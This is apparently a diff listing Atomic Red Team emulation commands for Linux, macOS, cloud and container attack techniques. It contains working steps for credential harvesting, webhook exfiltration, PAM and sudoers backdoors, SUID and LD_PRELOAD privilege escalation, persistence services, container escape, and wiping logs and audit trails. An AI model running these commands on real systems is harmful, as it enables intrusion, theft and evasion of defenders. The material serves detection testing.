+echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | b64decode -r
+echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | b64decode -r
+echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
+echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh
+echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | b64decode -r | sh
+ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256)
+printf $ENCODED | xxd -r -p
+echo $ENCODED | xxd -r -p
+echo $(echo $ENCODED) | xxd -r -p
+echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded
+echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p
+echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p
+echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
+echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash
+echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash
+python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: "".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = "AAkqKQEM"; key = "waEHleblxiQjoxFJQaIMLdHKz"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'
+kubectl run atomic-npm-install --image=node:18 --restart=Never --attach --rm -i -- bash -lc "mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install tinycolor --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"
+cat /etc/pam.d/common-password
+cat /etc/pam.d/passwd
+cat /etc/security/pwquality.conf
+cat /etc/pam.d/system-auth
+cat /etc/login.defs
+find / -path "*.mozilla/firefox/*/places.sqlite" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \;
+cat /tmp/T1217-Firefox.txt 2>/dev/null
+find / -path "*/.config/chromium/*/Bookmarks" -exec echo {} >> /tmp/T1217-Chrome.txt \;
+cat /tmp/T1217-Chrome.txt 2>/dev/null
+chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002
+chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002
+chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002
+chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002
+chown root:root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml
+chown -R root:root /tmp/AtomicRedTeam/atomics/T1222.002
+chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml
+chown -R root /tmp/AtomicRedTeam/atomics/T1222.002
+chattr -i /var/spool/cron/root
+touch /tmp/T1222.002.txt
+chflags simmutable /tmp/T1222.002.txt
+chflags nosimmutable /tmp/T1222.002.txt
+/tmp/T1222002 /tmp/ T1222002
+dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes
+echo "passwd" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd
+$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd
+which_ccencrypt=`which ccencrypt`
+cp /etc/passwd /tmp/passwd;
+$which_ccencrypt -T -K passwd /tmp/passwd
+which_openssl=`which openssl`
+$which_openssl genrsa -out /tmp/key.pem 2048
+$which_openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem
+$which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip
+sudo systemctl stop cron
+sudo killall -SIGTERM cron
+sudo kill -SIGTERM $(pgrep cron)
+sudo pkill -SIGTERM ^cron$
+echo "e" > /proc/sysrq-trigger
+yes > /dev/null
+if (systemd-detect-virt) then echo "Virtualization Environment detected"; fi;
+if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo "Virtualization Environment detected"; fi;
+if [ "$(sysctl -n hw.hv_vendor)" != "" ]; then echo "Virtualization Environment detected"; fi
+ping -c 250 8.8.8.8 > /dev/null
+ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'
+pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
+shutdown -r now
+shutdown -h now
+reboot
+halt -p
+halt -r
+halt --reboot
+poweroff
+poweroff -r 3
+poweroff --reboot
+echo "b" > /proc/sysrq-trigger
+passwd ARTUser #enter admin password > enter new password > confirm new password
+echo "[Unit]" > /etc/systemd/system/art-systemd-service.service
+echo "Description=Atomic Red Team Systemd Service" >> /etc/systemd/system/art-systemd-service.service
+echo "" >> /etc/systemd/system/art-systemd-service.service
+echo "[Service]" >> /etc/systemd/system/art-systemd-service.service
+echo "ExecStart=/bin/touch /tmp/art-systemd-execstart-marker" >> /etc/systemd/system/art-systemd-service.service
+echo "ExecStartPre=/bin/touch /tmp/art-systemd-execstartpre-marker" >> /etc/systemd/system/art-systemd-service.service
+echo "ExecStartPost=/bin/touch /tmp/art-systemd-execstartpost-marker" >> /etc/systemd/system/art-systemd-service.service
+echo "ExecReload=/bin/touch /tmp/art-systemd-execreload-marker" >> /etc/systemd/system/art-systemd-service.service
+echo "ExecStop=/bin/touch /tmp/art-systemd-execstop-marker" >> /etc/systemd/system/art-systemd-service.service
+echo "ExecStopPost=/bin/touch /tmp/art-systemd-execstoppost-marker" >> /etc/systemd/system/art-systemd-service.service
+echo "[Install]" >> /etc/systemd/system/art-systemd-service.service
+echo "WantedBy=default.target" >> /etc/systemd/system/art-systemd-service.service
+systemctl enable art-systemd-service.service
+systemctl start art-systemd-service.service
+echo '#\!/bin/sh' > /usr/local/etc/rc.d/art-test
+echo ' ' >> /usr/local/etc/rc.d/art-test
+echo '#' >> /usr/local/etc/rc.d/art-test
+echo '# PROVIDE: art-test' >> /usr/local/etc/rc.d/art-test
+echo '# REQUIRE: LOGIN' >> /usr/local/etc/rc.d/art-test
+echo '# KEYWORD: shutdown' >> /usr/local/etc/rc.d/art-test
+echo '. /etc/rc.subr' >> /usr/local/etc/rc.d/art-test
+echo 'name="art_test"' >> /usr/local/etc/rc.d/art-test
+echo 'rcvar=art_test_enable' >> /usr/local/etc/rc.d/art-test
+echo 'load_rc_config ${name}' >> /usr/local/etc/rc.d/art-test
+echo 'command="/usr/bin/touch"' >> /usr/local/etc/rc.d/art-test
+echo 'start_cmd="art_test_start"' >> /usr/local/etc/rc.d/art-test
+echo '' >> /usr/local/etc/rc.d/art-test
+echo 'art_test_start()' >> /usr/local/etc/rc.d/art-test
+echo '{' >> /usr/local/etc/rc.d/art-test
+echo ' ${command} /tmp/art-test.marker' >> /usr/local/etc/rc.d/art-test
+echo '}' >> /usr/local/etc/rc.d/art-test
+echo 'run_rc_command "$1"' >> /usr/local/etc/rc.d/art-test
+chmod +x /usr/local/etc/rc.d/art-test
+service art-test enable
+service art-test start
+echo "#!/bin/bash" > /etc/init.d/T1543.002
+echo "### BEGIN INIT INFO" >> /etc/init.d/T1543.002
+echo "# Provides : Atomic Test T1543.002" >> /etc/init.d/T1543.002
+echo "# Required-Start: \$all" >> /etc/init.d/T1543.002
+echo "# Required-Stop : " >> /etc/init.d/T1543.002
+echo "# Default-Start: 2 3 4 5" >> /etc/init.d/T1543.002
+echo "# Default-Stop: " >> /etc/init.d/T1543.002
+echo "# Short Description: Atomic Test for Systemd Service Creation" >> /etc/init.d/T1543.002
+echo "### END INIT INFO" >> /etc/init.d/T1543.002
+echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK')) \" " >> /etc/init.d/T1543.002
+chmod +x /etc/init.d/T1543.002
+if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID="centos"') ]; then chkconfig T1543.002 on ; else echo "Please run this test on Ubnutu , kali OR centos" ; fi
+systemctl enable T1543.002
+systemctl start T1543.002
+echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\"" | sudo tee -a /etc/init.d/T1543.002
+systemctl restart T1543.002
+echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bash_profile
+echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bashrc
+echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.shrc
+echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile
+echo '# Atomic Red Team was here... T1546.004' >> ~/.profile
+echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh
+useradd --create-home --shell /bin/bash art
+su -l art -c "echo 'echo \"Atomic Red Team was here... T1546.004\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit"
+trap 'echo "$BASH_COMMAND" >> /tmp/art-fish.txt' DEBUG
+cat /tmp/art-fish.txt
+TEMPDIR="/tmp/atomic_sitecust_posix"
+mkdir -p "$TEMPDIR"
+"python3" -m venv "$TEMPDIR/env"
+SITE_PACKAGES=$("$TEMPDIR/env/bin/python3" -c "import site; print(site.getsitepackages()[0])")
+echo "import os; os.system('cat /etc/passwd 1> /tmp/atomic_hook_poc.txt')" > "$SITE_PACKAGES/atomic_hook.pth"
+ls -la "$SITE_PACKAGES/atomic_hook.pth"
+"$TEMPDIR/env/bin/python" -c "print('Triggering Hook via atomic_hook...')"
+if [ -f /tmp/atomic_hook_poc.txt ]; then echo "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/ | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt not found"; fi
+PYTHON_EXE=$(command -v python3 || command -v python)
+USER_PACKAGES=$($PYTHON_EXE -c "import site; print(site.getusersitepackages())")
+mkdir -p "$USER_PACKAGES"
+echo "import os; os.system('date > /tmp/poc.txt')" > "$USER_PACKAGES/usercustomize.py"
+if [ -f "$USER_PACKAGES/usercustomize.py" ]; then echo "Success: usercustomize.py created under $USER_PACKAGES\n" $(ls -la "$USER_PACKAGES" | grep usercustomize*); else echo "Failed: usercustomize.py not found under $USER_PACKAGES"; fi
+$PYTHON_EXE -c "print('Triggering Hook via usercustomize.py...')"
+if [ -f /tmp/poc.txt ]; then echo "Success: poc.txt created under /tmp\n" $(ls -la /tmp/ | grep -w poc.txt); else echo "Failed: /tmp/poc.txt not found"; fi
+sudo insmod /tmp/T1547.006/T1547006.ko
+sudo chown root /tmp/hello.c
+sudo make /tmp/hello
+sudo chown root /tmp/hello
+sudo chmod u+s /tmp/hello
+/tmp/hello
+chown root /tmp/hello.c
+make /tmp/hello
+chown root /tmp/hello
+chmod u+s /tmp/hello
+sudo touch /tmp/evilBinary
+sudo chown root /tmp/evilBinary
+sudo chmod u+xs /tmp/evilBinary
+touch /tmp/evilBinary
+chown root /tmp/evilBinary
+chmod u+xs /tmp/evilBinary
+sudo chmod g+xs /tmp/evilBinary
+chmod g+xs /tmp/evilBinary
+make /tmp/cap
+sudo setcap cap_setuid=ep /tmp/cap
+/tmp/cap
+sudo setcap cap_setuid=ep /tmp/evilBinary
+find /usr/bin -perm -4000
+find /usr/bin -perm -2000
+sudo -l
+sudo cat /etc/sudoers
+sudo vim /etc/sudoers
+sudo cat /usr/local/etc/sudoers
+sudo ee /usr/local/etc/sudoers
+sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
+sudo visudo -c -f /etc/sudoers
+sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers
+sudo visudo -c -f /usr/local/etc/sudoers
+sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
+sudo sh -c "echo Defaults "'!'"tty_tickets >> /usr/local/etc/sudoers"
+find //.aws -name "credentials" -type f 2>/dev/null
+grep -ri password /
+for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
+find //.azure -name "msal_token_cache.json" -o -name "accessTokens.json" -type f 2>/dev/null
+find //.config/gcloud -name "credentials.db" -o -name "access_tokens.db" -type f 2>/dev/null
+find //.oci/sessions -name "token" -type f 2>/dev/null
+cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
+cat ~/.history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt
+find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt
+mkdir /tmp/art-staging
+find / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \;
+find / -name id_rsa 2>/dev/null -exec gcp --parents {} /tmp/art-staging \;
+find / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \;
+mkdir /tmp/GnuPG
+find / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \;
+token=$(curl -s --connect-timeout 2 -m 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+role=$(curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -o "/tmp/T1552.005_aws_imds_creds.json"
+if [ -s "/tmp/T1552.005_aws_imds_creds.json" ]; then cat "/tmp/T1552.005_aws_imds_creds.json"; else echo "No IAM credentials returned (host is not an EC2 instance with an attached role)"; fi
+kubectl get secrets --all-namespaces
+kubectl get secrets -n default
+kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
+export AWS_REGION=us-west-2
+./stratus warmup aws.credential-access.ec2-get-password-data
+./stratus detonate aws.credential-access.ec2-get-password-data --force
+openssl genrsa -out rootCA.key 4096
+openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out rootCA.crt
+cp rootCA.crt /etc/pki/ca-trust/source/anchors/
+update-ca-trust
+cp rootCA.crt /usr/local/share/certs/
+certctl rehash
+mv rootCA.crt /usr/local/share/ca-certificates
+sudo update-ca-certificates
+python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt
+sudo sed -i "1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g" /etc/pam.d/su-l
+sudo sed -i "" "8s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g" /etc/pam.d/su
+sudo sed -i "1s,^,auth sufficient /tmp/pam_evil.so\n,g" /etc/pam.d/su-l
+zip $HOME/data.zip /var/log/{w,b}tmp
+test -e $HOME/victim-gzip.txt && gzip -k $HOME/victim-gzip.txt || (echo 'confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101' >> $HOME/victim-gzip.txt; gzip -k $HOME/victim-gzip.txt)
+tar -cvzf $HOME/data.tar.gz $HOME/$USERNAME
+mkdir -p /tmp/T1560
+cd /tmp/T1560; touch a b c d e f g
+zip --password "InsertPasswordHere" /tmp/T1560/T1560 ./*
+echo "InsertPasswordHere" | gpg --batch --yes --passphrase-fd 0 --output /tmp/T1560/T1560.zip.gpg -c /tmp/T1560/T1560.zip
+ls -l /tmp/T1560
+zip -r /tmp/t1560/t1560_data.zip /tmp/t1560
+openssl enc -aes-256-cbc -pass pass:atomic_enc_pass -p -in /tmp/t1560/t1560_data.zip -out /tmp/t1560/t1560_data.enc
+cat /tmp/t1560/t1560_data.enc | base64
+which_python=`which python || which python3`
+$which_python -c "import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();"
+$which_python -c "import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();"
+$which_python -c "from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')"
+$which_python -c "import tarfile; output_file = tarfile.open('/tmp/passwd.tar.gz','w'); output_file.add('/etc/passwd'); output_file.close()"
+mkdir /var/tmp/.hidden-directory
+echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
+echo "secrets, api keys, passwords - T1567.004 atomic test" > "/tmp/T1567.004_loot.txt"
+curl -s -F "file=@/tmp/T1567.004_loot.txt" "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken"
+curl -s -X POST -H 'Content-type: application/json' --data "{\"text\":\"$(cat /tmp/T1567.004_loot.txt)\"}" "https://hooks.slack.com/services/T00000000/B00000000/ReplaceWithYourWebhookToken"
+psexec.py '/Administrator:P@ssw0rd1@127.0.0.1' 'whoami'
+echo "[Unit]" > /etc/systemd/system/atomic-test.service
+echo "Description=Atomic Test Service" >> /etc/systemd/system/atomic-test.service
+echo "After=network.target" >> /etc/systemd/system/atomic-test.service
+echo "" >> /etc/systemd/system/atomic-test.service
+echo "[Service]" >> /etc/systemd/system/atomic-test.service
+echo "ExecStart=/bin/bash -c "echo atomictest > /tmp/atomic_service_output.txt"" >> /etc/systemd/system/atomic-test.service
+echo "Restart=on-failure" >> /etc/systemd/system/atomic-test.service
+echo "[Install]" >> /etc/systemd/system/atomic-test.service
+echo "WantedBy=multi-user.target" >> /etc/systemd/system/atomic-test.service
+systemctl enable atomic-test.service
+systemctl start atomic-test.service
+systemctl status atomic-test.service
+echo "[Unit]" > /tmp/atomic_tmp.service
+echo "Description=Atomic Tmp Service" >> /tmp/atomic_tmp.service
+echo "" >> /tmp/atomic_tmp.service
+echo "[Service]" >> /tmp/atomic_tmp.service
+echo "ExecStart=/bin/bash -c "id > /tmp/atomic_tmp_output.txt"" >> /tmp/atomic_tmp.service
+echo "[Install]" >> /tmp/atomic_tmp.service
+echo "WantedBy=multi-user.target" >> /tmp/atomic_tmp.service
+systemctl link /tmp/atomic_tmp.service
+systemctl start $(basename /tmp/atomic_tmp.service)
+systemctl status $(basename /tmp/atomic_tmp.service)
+echo "[Unit]" > /dev/shm/atomic_shm.service
+echo "Description=Atomic SHM Service" >> /dev/shm/atomic_shm.service
+echo "" >> /dev/shm/atomic_shm.service
+echo "[Service]" >> /dev/shm/atomic_shm.service
+echo "ExecStart=/bin/bash -c "whoami > /tmp/atomic_shm_output.txt"" >> /dev/shm/atomic_shm.service
+echo "[Install]" >> /dev/shm/atomic_shm.service
+echo "WantedBy=multi-user.target" >> /dev/shm/atomic_shm.service
+systemctl link /dev/shm/atomic_shm.service
+systemctl start $(basename /dev/shm/atomic_shm.service)
+systemctl status $(basename /dev/shm/atomic_shm.service)
+echo "[Unit]" > /etc/systemd/system/atomic-modify-test.service
+echo "Description=Legitimate Looking Service" >> /etc/systemd/system/atomic-modify-test.service
+echo "" >> /etc/systemd/system/atomic-modify-test.service
+echo "[Service]" >> /etc/systemd/system/atomic-modify-test.service
+echo "ExecStart=/bin/true" >> /etc/systemd/system/atomic-modify-test.service
+echo "[Install]" >> /etc/systemd/system/atomic-modify-test.service
+echo "WantedBy=multi-user.target" >> /etc/systemd/system/atomic-modify-test.service
+sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c "echo hijacked > /tmp/atomic_hijack_output.txt"|' /etc/systemd/system/atomic-modify-test.service
+systemctl start atomic-modify-test.service
+systemctl status atomic-modify-test.service
+systemd-run --unit=atomic-transient --wait /bin/bash -c "id > /tmp/atomic_transient_output.txt"
+systemctl status atomic-transient.service 2>/dev/null || echo "Transient service has already completed and exited."
+systemctl list-units --type=service --all
+systemctl list-unit-files --type=service
+echo "[Unit]" > /etc/systemd/system/atomic-persist.service
+echo "Description=Atomic Persistence Service" >> /etc/systemd/system/atomic-persist.service
+echo "After=network.target" >> /etc/systemd/system/atomic-persist.service
+echo "" >> /etc/systemd/system/atomic-persist.service
+echo "[Service]" >> /etc/systemd/system/atomic-persist.service
+echo "ExecStart=/tmp/atomic_payload.sh" >> /etc/systemd/system/atomic-persist.service
+echo "Restart=always" >> /etc/systemd/system/atomic-persist.service
+echo "RestartSec=10" >> /etc/systemd/system/atomic-persist.service
+echo "[Install]" >> /etc/systemd/system/atomic-persist.service
+echo "WantedBy=multi-user.target" >> /etc/systemd/system/atomic-persist.service
+systemctl enable atomic-persist.service
+systemctl start atomic-persist.service
+systemctl status atomic-persist.service
+echo "[Unit]" > /etc/systemd/system/systemd-network-helper.service
+echo "Description=Network connectivity helper service" >> /etc/systemd/system/systemd-network-helper.service
+echo "After=network.target" >> /etc/systemd/system/systemd-network-helper.service
+echo "Before=network-online.target" >> /etc/systemd/system/systemd-network-helper.service
+echo "" >> /etc/systemd/system/systemd-network-helper.service
+echo "[Service]" >> /etc/systemd/system/systemd-network-helper.service
+echo "ExecStart=/bin/bash -c "echo masquerade > /tmp/atomic_masquerade_output.txt"" >> /etc/systemd/system/systemd-network-helper.service
+echo "Restart=on-failure" >> /etc/systemd/system/systemd-network-helper.service
+echo "RestartSec=5" >> /etc/systemd/system/systemd-network-helper.service
+echo "[Install]" >> /etc/systemd/system/systemd-network-helper.service
+echo "WantedBy=multi-user.target" >> /etc/systemd/system/systemd-network-helper.service
+systemctl start systemd-network-helper.service
+systemctl status systemd-network-helper.service
+echo quit | telnet google.com 8081
+nohup code tunnel --accept-server-license-terms >/dev/null 2>&1 &
+sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'
+LD_PRELOAD=/tmp/T1574006.so ls
+aws ec2 run-instances --image-id ami-12345678 --instance-type tg4.nano --region us-east-1 --profile default
+printf '%s\n' '#!/bin/bash' 'date -u > /var/tmp/userdata-ran.txt' > my_script.txt
+aws ec2 run-instances --image-id ami-12345678 --instance-type tg4.nano --count 1 --subnet-id subnet-XXXXXXXXXXXXXXX --key-name MyKeyPair --user-data file://my_script.txt
+./stratus warmup aws.discovery.ec2-enumerate-from-instance
+./stratus detonate aws.discovery.ec2-enumerate-from-instance
+sleep 3
+kubectl exec -n default busybox -- uname
+docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh
+docker exec -i t1609_container bash -c "cat /tmp/output.txt"
+docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
+kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
+if [ ! -d /mnt/T1611.002 ]; then mkdir /mnt/T1611.002 ; mount /dev/dm-0 /mnt/T1611.002; fi
+echo -n "$" >> /mnt/T1611.002/etc/cron.d/T1611_002
+echo -n "(hostname) " >> /mnt/T1611.002/etc/cron.d/T1611_002
+netcat -l -p 4444 2>&1
+sudo -u docker_user sh -c "sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"
+docker run --name t1612_container --rm -d -t t1612
+docker exec t1612_container ./test.sh
+docker run --name t1613_container --rm -d -t t1613
+docker ps
+docker stats --no-stream
+docker inspect $(docker ps -l -q --filter ancestor=t1613)
+podman run --name t1613_container --rm -d -t t1613
+podman ps
+podman stats --no-stream
+podman inspect $(podman ps -l -q --filter ancestor=t1613)
+locale
+localectl status
+[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale
+env | grep LANG
+printenv LANG
+set | grep LANG
+curl -k https://ipinfo.io/
+find /lib/modules/$(uname -r)/kernel/drivers -name "*.ko*"
+curl -skI --proxy http://127.0.0.1:8080 http://example.com > /tmp/curl_out.txt
+grep "X-Atomic" /tmp/curl_out.txt || (cat /tmp/curl_out.txt && exit 1)
+curl -sk --proxy http://127.0.0.1:8080 http://example.com > /tmp/atomic_t1659_page.html
+grep -q "Atomic T1659 Injection" /tmp/atomic_t1659_page.html || (head -20 /tmp/atomic_t1659_page.html; exit 1)
+./stratus warmup aws.defense-evasion.cloudtrail-event-selectors
+./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force
+./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule
+./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force
+./stratus warmup aws.defense-evasion.vpc-remove-flow-logs
+./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force
+auditctl -D
+auditctl -e 0
+sudo rm -rf /var/log/system.log
+if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi
+rm -rf /var/log/messages
+rm -rf /var/log/security
+truncate -s 0 /var/log/messages #size parameter shorthand
+truncate --size=0 /var/log/security #size parameter
+cat /dev/null > /var/log/messages #truncating the file to zero bytes
+cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)
+echo '' > /var/log/messages
+unlink /var/log/messages
+sudo rm /var/log/journal/* #physically deletes the journal files, and not just their content
+sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place
+echo 0> /var/spool/mail/root
+echo 0> /var/log/secure
+ufw disable
+service pf stop
+service pf disable
+systemctl stop ufw
+ufw logging off
+ufw prepend deny from 1.2.3.4
+ufw status numbered
+echo "block in proto tcp from 1.2.3.4 to any" | pfctl -a pf-rules -f -
+pfctl -a pf-rules -s rules
+echo "# THIS IS A COMMENT" >> /etc/ufw/user.rules
+grep "# THIS IS A COMMENT" /etc/ufw/user.rules
+echo "# THIS IS A COMMENT" >> /etc/ufw/ufw.conf
+grep "# THIS IS A COMMENT" /etc/ufw/ufw.conf
+echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf
+grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
+echo "# THIS IS A COMMENT" >> /etc/default/ufw
+grep "# THIS IS A COMMENT" /etc/default/ufw
+tail /var/log/ufw.log
+iptables-save > /tmp/iptables.rules
+iptables -F
+iptables -D OUTPUT -p tcp --dport 21 -j DROP
+export HISTCONTROL=ignoreboth
+export HISTSIZE=0
+cp $HISTFILE $HISTFILE.OLD
+if ((${#HISTFILE[@]})); then echo $HISTFILE; fi
+echo "" > $HISTFILE
+if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo "$HISTFILE is larger than 1k"; fi
+ls -la $HISTFILE
+cat $HISTFILE
+if [ $(history |wc -l) -eq 1 ]; then echo "History cache cleared"; fi
+TEST=$(echo $HISTCONTROL)
+if [ "$HISTCONTROL" != "ignoreboth" ]; then export HISTCONTROL="ignoreboth"; fi
+ls -la $HISTFILE # " ls -la $HISTFILE"
+if [ $(history |wc -l) -eq 1 ]; then echo "ls -la is not in history cache"; fi
+if [ "$HISTCONTROL" != "erasedups" ]; then export HISTCONTROL="erasedups"; fi
+if [ $(history |wc -l) -eq 2 ]; then echo "Their is only one entry for ls -la $HISTFILE"; fi
+TEST=$(echo $HISTFILESIZE)
+echo $HISTFILESIZE
+if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo "\$HISTFILESIZE is zero"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"; fi
+echo $HISTSIZE
+if [ $(echo $HISTSIZE) -eq 0 ]; then echo "\$HISTSIZE is zero"; else HIST_LENGTH=$(wc -l $HISTFILE); echo "\$HISTSIZE is not zero, history size is $HIST_LENGTH"; fi
+TEST=$(echo $HISTFILE)
+echo $HISTFILE
+export HISTFILE="/dev/null"
+if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT"; fi
+if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; fi
+if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='ls*:rm*:ssh*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi
+ls -la ~/.bash_logout
+if [ $(history |wc -l) -eq 1 ]; then echo "ls commands are not in history"; fi
+unset HISTIGNORE
